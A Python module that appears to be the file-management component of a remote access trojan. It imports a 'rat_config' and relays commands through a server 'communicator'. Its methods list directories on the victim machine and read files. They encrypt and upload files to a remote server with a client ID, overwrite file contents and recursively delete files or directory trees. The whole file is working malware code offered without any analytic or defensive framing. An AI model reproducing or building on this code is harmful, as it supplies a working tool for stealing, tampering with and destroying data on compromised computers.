import os
import logging
from datetime import datetime
import base64
from rat_config import Config
import shutil

class FileManager:
    def __init__(self, encryption, communicator):
        self.encryption = encryption
        self.communicator = communicator
        if Config.DEBUG_MODE:
            logging.info("FileManager initialized")

    def list_files(self, path):
        """List files and directories in the specified path."""
        try:
            if not os.path.exists(path):
                return {"error": f"Path not found: {path}"}
            
            result = []
            for entry in os.listdir(path):
                full_path = os.path.join(path, entry)
                stats = os.stat(full_path)
                result.append({
                    "name": entry,
                    "path": full_path,
                    "is_dir": os.path.isdir(full_path),
                    "size": stats.st_size,
                    "modified": datetime.fromtimestamp(stats.st_mtime).isoformat()
                })
            if Config.DEBUG_MODE:
                logging.info(f"Listed files in {path}: {len(result)} entries")
            return {"files": result}
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Error listing files in {path}: {str(e)}")
            return {"error": str(e)}

    def read_file(self, file_path):
        """Read the content of a file and encode it in Base64."""
        try:
            if not os.path.exists(file_path):
                return {"error": f"File not found: {file_path}"}
            if not os.path.isfile(file_path):
                return {"error": f"Not a file: {file_path}"}
            
            with open(file_path, 'rb') as f:
                content = f.read()
            encoded_content = base64.b64encode(content).decode('utf-8')
            if Config.DEBUG_MODE:
                logging.info(f"Read file: {file_path}, size: {len(content)} bytes")
            return {
                "filename": os.path.basename(file_path),
                "content": encoded_content
            }
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Error reading file {file_path}: {str(e)}")
            return {"error": str(e)}

    def download_file(self, file_path):
        """Download a file by sending it to the server."""
        try:
            if not os.path.exists(file_path):
                return {"error": f"File not found: {file_path}"}
            if not os.path.isfile(file_path):
                return {"error": f"Not a file: {file_path}"}
            
            with open(file_path, 'rb') as f:
                content = f.read()
            encrypted_content = self.encryption.encrypt(content)
            response = self.communicator.upload_file({
                "filename": os.path.basename(file_path),
                "client_id": self.communicator.client_id,
                "content": encrypted_content,
                "timestamp": datetime.now().isoformat()
            })
            if Config.DEBUG_MODE:
                logging.info(f"Downloaded file {file_path} to server")
            return {"status": "success", "response": response}
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Error downloading file {file_path}: {str(e)}")
            return {"error": str(e)}

    def edit_file(self, file_path, new_content):
        """Edit the content of a file."""
        try:
            if not os.path.exists(file_path):
                return {"error": f"File not found: {file_path}"}
            if not os.path.isfile(file_path):
                return {"error": f"Not a file: {file_path}"}
            
            # Decode Base64 content if provided
            try:
                decoded_content = base64.b64decode(new_content).decode('utf-8')
            except Exception:
                decoded_content = new_content  # Assume plain text if not Base64
            
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(decoded_content)
            if Config.DEBUG_MODE:
                logging.info(f"Edited file: {file_path}")
            return {"status": "success"}
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Error editing file {file_path}: {str(e)}")
            return {"error": str(e)}

    def delete_file(self, file_path):
        """Delete a file or directory."""
        try:
            if not os.path.exists(file_path):
                return {"error": f"Path not found: {file_path}"}
            
            if os.path.isfile(file_path):
                os.remove(file_path)
                if Config.DEBUG_MODE:
                    logging.info(f"Deleted file: {file_path}")
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
                if Config.DEBUG_MODE:
                    logging.info(f"Deleted directory: {file_path}")
            return {"status": "success"}
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Error deleting {file_path}: {str(e)}")
            return {"error": str(e)}